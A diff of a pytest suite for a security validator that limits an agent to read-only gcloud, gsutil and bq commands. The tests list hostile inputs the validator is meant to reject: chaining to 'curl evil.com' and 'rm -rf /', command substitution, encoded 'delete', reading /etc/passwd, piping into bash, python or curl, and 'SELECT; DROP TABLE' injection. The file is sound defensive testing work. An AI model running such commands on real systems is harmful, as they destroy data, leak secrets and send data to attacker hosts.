@@ -11,6 +11,7 @@ Layers 1–4 (the static, deterministic layers):
   Layer 3: Pipe Valid.   — only safe pipe targets (head, wc, jq, grep, ...)
   Layer 4: Safety Checks — length cap, bq SELECT-only, encoding tricks
 """
+
 import pytest
 
 from ghosthunter.security.validator import SecurityValidator, ValidationResult
@@ -32,29 +33,19 @@ class TestFastReject:
         assert not result.allowed
 
     def test_blocks_and_chaining(self, validator):
-        assert not validator.is_allowed(
-            "gcloud compute instances list && curl evil.com"
-        ).allowed
+        assert not validator.is_allowed("gcloud compute instances list && curl evil.com").allowed
 
     def test_blocks_or_chaining(self, validator):
-        assert not validator.is_allowed(
-            "gcloud compute instances list || rm -rf /"
-        ).allowed
+        assert not validator.is_allowed("gcloud compute instances list || rm -rf /").allowed
 
     def test_blocks_command_substitution_dollar_paren(self, validator):
-        assert not validator.is_allowed(
-            "gcloud compute instances list $(whoami)"
-        ).allowed
+        assert not validator.is_allowed("gcloud compute instances list $(whoami)").allowed
 
     def test_blocks_command_substitution_backticks(self, validator):
-        assert not validator.is_allowed(
-            "gcloud compute instances list `whoami`"
-        ).allowed
+        assert not validator.is_allowed("gcloud compute instances list `whoami`").allowed
 
     def test_blocks_brace_substitution(self, validator):
-        assert not validator.is_allowed(
-            "gcloud compute instances list ${HOME}"
-        ).allowed
+        assert not validator.is_allowed("gcloud compute instances list ${HOME}").allowed
 
     def test_blocks_curl(self, validator):
         assert not validator.is_allowed("curl http://evil.com").allowed
@@ -82,9 +73,7 @@ class TestFastReject:
 
     def test_blocks_hex_encoding(self, validator):
         # Hex-encoded 'delete'
-        assert not validator.is_allowed(
-            "gcloud compute instances \\x64elete vm"
-        ).allowed
+        assert not validator.is_allowed("gcloud compute instances \\x64elete vm").allowed
 
     def test_blocks_octal_encoding(self, validator):
         assert not validator.is_allowed("gcloud compute \\144elete").allowed
@@ -93,20 +82,14 @@ class TestFastReject:
         assert not validator.is_allowed("gcloud compute %64elete").allowed
 
     def test_blocks_unquoted_redirect_out(self, validator):
-        result = validator.is_allowed(
-            "gcloud compute instances list > /tmp/out"
-        )
+        result = validator.is_allowed("gcloud compute instances list > /tmp/out")
         assert not result.allowed
 
     def test_blocks_unquoted_append_redirect(self, validator):
-        assert not validator.is_allowed(
-            "gcloud compute instances list >> /tmp/out"
-        ).allowed
+        assert not validator.is_allowed("gcloud compute instances list >> /tmp/out").allowed
 
     def test_blocks_unquoted_input_redirect(self, validator):
-        assert not validator.is_allowed(
-            "gcloud compute instances list < /etc/passwd"
-        ).allowed
+        assert not validator.is_allowed("gcloud compute instances list < /etc/passwd").allowed
 
     # --- legitimate gcloud syntax that LOOKS dangerous but isn't ---
 
@@ -117,7 +100,7 @@ class TestFastReject:
 
     def test_allows_redirect_inside_double_quotes(self, validator):
         # > inside a filter string is a comparison operator, not a redirect
-        cmd = 'gcloud logging read --filter="timestamp>\'2026-03-01\'" --limit=10'
+        cmd = "gcloud logging read --filter=\"timestamp>'2026-03-01'\" --limit=10"
         assert validator.is_allowed(cmd).allowed
 
     def test_allows_redirect_inside_single_quotes(self, validator):
@@ -146,9 +129,7 @@ class TestAllowlist:
         ).allowed
 
     def test_allows_with_format_flag(self, validator):
-        assert validator.is_allowed(
-            "gcloud compute instances list --format=json"
-        ).allowed
+        assert validator.is_allowed("gcloud compute instances list --format=json").allowed
 
     def test_allows_with_filter_flag(self, validator):
         assert validator.is_allowed(
@@ -156,9 +137,7 @@ class TestAllowlist:
         ).allowed
 
     def test_allows_with_project_flag(self, validator):
-        assert validator.is_allowed(
-            "gcloud compute instances list --project=my-proj"
-        ).allowed
+        assert validator.is_allowed("gcloud compute instances list --project=my-proj").allowed
 
     def test_allows_billing_accounts_list(self, validator):
         assert validator.is_allowed("gcloud billing accounts list").allowed
@@ -219,9 +198,7 @@ class TestAllowlist:
         assert validator.is_allowed("gcloud iam service-accounts list").allowed
 
     def test_allows_projects_get_iam_policy(self, validator):
-        assert validator.is_allowed(
-            "gcloud projects get-iam-policy my-project"
-        ).allowed
+        assert validator.is_allowed("gcloud projects get-iam-policy my-project").allowed
 
     def test_allows_pubsub_topics_list(self, validator):
         assert validator.is_allowed("gcloud pubsub topics list").allowed
@@ -242,19 +219,13 @@ class TestAllowlist:
         assert not result.allowed
 
     def test_blocks_instances_create(self, validator):
-        assert not validator.is_allowed(
-            "gcloud compute instances create my-vm"
-        ).allowed
+        assert not validator.is_allowed("gcloud compute instances create my-vm").allowed
 
     def test_blocks_instances_stop(self, validator):
-        assert not validator.is_allowed(
-            "gcloud compute instances stop my-vm"
-        ).allowed
+        assert not validator.is_allowed("gcloud compute instances stop my-vm").allowed
 
     def test_blocks_firewall_rules_delete(self, validator):
-        assert not validator.is_allowed(
-            "gcloud compute firewall-rules delete allow-all"
-        ).allowed
+        assert not validator.is_allowed("gcloud compute firewall-rules delete allow-all").allowed
 
     def test_blocks_iam_set_policy(self, validator):
         assert not validator.is_allowed(
@@ -262,17 +233,13 @@ class TestAllowlist:
         ).allowed
 
     def test_blocks_sql_instances_delete(self, validator):
-        assert not validator.is_allowed(
-            "gcloud sql instances delete my-db"
-        ).allowed
+        assert not validator.is_allowed("gcloud sql instances delete my-db").allowed
 
     def test_blocks_gsutil_rm(self, validator):
         assert not validator.is_allowed("gsutil rm gs://bucket/file").allowed
 
     def test_blocks_unknown_gcloud_subcommand(self, validator):
-        assert not validator.is_allowed(
-            "gcloud some-future-service do-thing"
-        ).allowed
+        assert not validator.is_allowed("gcloud some-future-service do-thing").allowed
 
     def test_blocks_non_gcloud_command(self, validator):
         assert not validator.is_allowed("ls -la").allowed
@@ -285,14 +252,10 @@ class TestPipeValidation:
     """Layer 3 only allows known-safe pipe targets."""
 
     def test_allows_head(self, validator):
-        assert validator.is_allowed(
-            "gcloud logging read 'x' --limit=2000 | head -30"
-        ).allowed
+        assert validator.is_allowed("gcloud logging read 'x' --limit=2000 | head -30").allowed
 
     def test_allows_wc_l(self, validator):
-        assert validator.is_allowed(
-            "gcloud compute instances list | wc -l"
-        ).allowed
+        assert validator.is_allowed("gcloud compute instances list | wc -l").allowed
 
     def test_allows_chained_safe_pipes(self, validator):
         assert validator.is_allowed(
@@ -305,44 +268,28 @@ class TestPipeValidation:
         ).allowed
 
     def test_allows_grep_pipe(self, validator):
-        assert validator.is_allowed(
-            "gcloud compute instances list | grep 'RUNNING'"
-        ).allowed
+        assert validator.is_allowed("gcloud compute instances list | grep 'RUNNING'").allowed
 
     def test_allows_sort_uniq(self, validator):
-        assert validator.is_allowed(
-            "gcloud compute instances list | sort | uniq -c"
-        ).allowed
+        assert validator.is_allowed("gcloud compute instances list | sort | uniq -c").allowed
 
     def test_blocks_curl_pipe(self, validator):
-        assert not validator.is_allowed(
-            "gcloud logging read 'x' | curl http://evil.com"
-        ).allowed
+        assert not validator.is_allowed("gcloud logging read 'x' | curl http://evil.com").allowed
 
     def test_blocks_bash_pipe(self, validator):
-        assert not validator.is_allowed(
-            "gcloud compute instances list | bash"
-        ).allowed
+        assert not validator.is_allowed("gcloud compute instances list | bash").allowed
 
     def test_blocks_sh_pipe(self, validator):
-        assert not validator.is_allowed(
-            "gcloud compute instances list | sh"
-        ).allowed
+        assert not validator.is_allowed("gcloud compute instances list | sh").allowed
 
     def test_blocks_xargs_pipe(self, validator):
-        assert not validator.is_allowed(
-            "gcloud compute instances list | xargs rm"
-        ).allowed
+        assert not validator.is_allowed("gcloud compute instances list | xargs rm").allowed
 
     def test_blocks_tee_pipe(self, validator):
-        assert not validator.is_allowed(
-            "gcloud compute instances list | tee /tmp/out"
-        ).allowed
+        assert not validator.is_allowed("gcloud compute instances list | tee /tmp/out").allowed
 
     def test_blocks_python_pipe(self, validator):
-        assert not validator.is_allowed(
-            "gcloud compute instances list | python"
-        ).allowed
+        assert not validator.is_allowed("gcloud compute instances list | python").allowed
 
 
 # ---------------------------------------------------------------------------
@@ -352,14 +299,10 @@ class TestBqQueryValidation:
     """bq query is allowed but constrained to SELECT statements."""
 
     def test_allows_simple_select(self, validator):
-        assert validator.is_allowed(
-            "bq query 'SELECT * FROM dataset.table'"
-        ).allowed
+        assert validator.is_allowed("bq query 'SELECT * FROM dataset.table'").allowed
 
     def test_allows_select_with_double_quotes(self, validator):
-        assert validator.is_allowed(
-            'bq query "SELECT cost FROM billing.export"'
-        ).allowed
+        assert validator.is_allowed('bq query "SELECT cost FROM billing.export"').allowed
 
     def test_allows_select_with_flags(self, validator):
         assert validator.is_allowed(
@@ -367,19 +310,13 @@ class TestBqQueryValidation:
         ).allowed
 
     def test_allows_select_with_use_legacy_sql_false(self, validator):
-        assert validator.is_allowed(
-            "bq query --use_legacy_sql=false 'SELECT 1'"
-        ).allowed
+        assert validator.is_allowed("bq query --use_legacy_sql=false 'SELECT 1'").allowed
 
     def test_blocks_insert(self, validator):
-        assert not validator.is_allowed(
-            "bq query 'INSERT INTO t VALUES (1)'"
-        ).allowed
+        assert not validator.is_allowed("bq query 'INSERT INTO t VALUES (1)'").allowed
 
     def test_blocks_update(self, validator):
-        assert not validator.is_allowed(
-            "bq query 'UPDATE t SET x=1 WHERE id=1'"
-        ).allowed
+        assert not validator.is_allowed("bq query 'UPDATE t SET x=1 WHERE id=1'").allowed
 
     def test_blocks_delete(self, validator):
         assert not validator.is_allowed("bq query 'DELETE FROM t'").allowed
@@ -388,28 +325,20 @@ class TestBqQueryValidation:
         assert not validator.is_allowed("bq query 'DROP TABLE t'").allowed
 
     def test_blocks_create(self, validator):
-        assert not validator.is_allowed(
-            "bq query 'CREATE TABLE t (id INT64)'"
-        ).allowed
+        assert not validator.is_allowed("bq query 'CREATE TABLE t (id INT64)'").allowed
 
     def test_blocks_alter(self, validator):
-        assert not validator.is_allowed(
-            "bq query 'ALTER TABLE t ADD COLUMN x INT64'"
-        ).allowed
+        assert not validator.is_allowed("bq query 'ALTER TABLE t ADD COLUMN x INT64'").allowed
 
     def test_blocks_truncate(self, validator):
         assert not validator.is_allowed("bq query 'TRUNCATE TABLE t'").allowed
 
     def test_blocks_grant(self, validator):
-        assert not validator.is_allowed(
-            "bq query 'GRANT SELECT ON t TO user'"
-        ).allowed
+        assert not validator.is_allowed("bq query 'GRANT SELECT ON t TO user'").allowed
 
     def test_blocks_select_with_trailing_drop(self, validator):
         # Defense in depth: regex matches SELECT, but string scan catches DROP
-        assert not validator.is_allowed(
-            "bq query 'SELECT * FROM t; DROP TABLE t'"
-        ).allowed
+        assert not validator.is_allowed("bq query 'SELECT * FROM t; DROP TABLE t'").allowed
 
 
 # ---------------------------------------------------------------------------
